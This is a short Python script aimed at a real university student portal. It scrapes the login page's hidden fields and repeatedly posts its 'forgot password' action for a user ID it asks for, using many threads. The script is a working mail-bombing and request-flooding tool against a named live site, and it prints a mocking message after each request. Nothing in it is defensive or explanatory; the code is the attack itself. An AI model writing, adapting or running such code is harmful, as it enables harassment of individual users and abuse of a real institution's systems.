import requests
import sys
from time import sleep
import threading
from bs4 import BeautifulSoup
from constants import USERS, BLACKLIST


url = "http://slcm.manipal.edu"
form = "{}/loginForm.aspx".format(url)

def xprint(mess):
    sys.stdout.write("%s\n" %mess)
 
def get_payload():
    payload = {}
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    for tag in soup.find_all(type="hidden"):
        payload[tag["id"]] = tag["value"]
       
    payload["__EVENTTARGET"]="hrpForgot"
    payload["txtpassword"]=""
    payload["Connection"]="Close"

    return payload


def mail(user, n) :
        payload = get_payload()
        for x in range(n):
            payload["txtUserid"]=user
            response = requests.post(form, data=payload)
            soup = BeautifulSoup(response.text, "html.parser")
            sleep(0.5)
            xprint("Fucked {} ( ͡° ͜ʖ ͡°) {} times".format(user,x+1))

if __name__ == '__main__':
    n0 = int(input('> Input threads : '))
    n = int(input('> Input number : ')) 
    user = input('> Input user : ')
    threads = []
    for i in range(n0):
        t1 = threading.Thread(target=mail, args=(user, n))
        threads.append(t1)

    for t in threads:
        t.start()
    for t in threads:
        t.join()
        
    xprint("**ALL COMPLETE**\n")


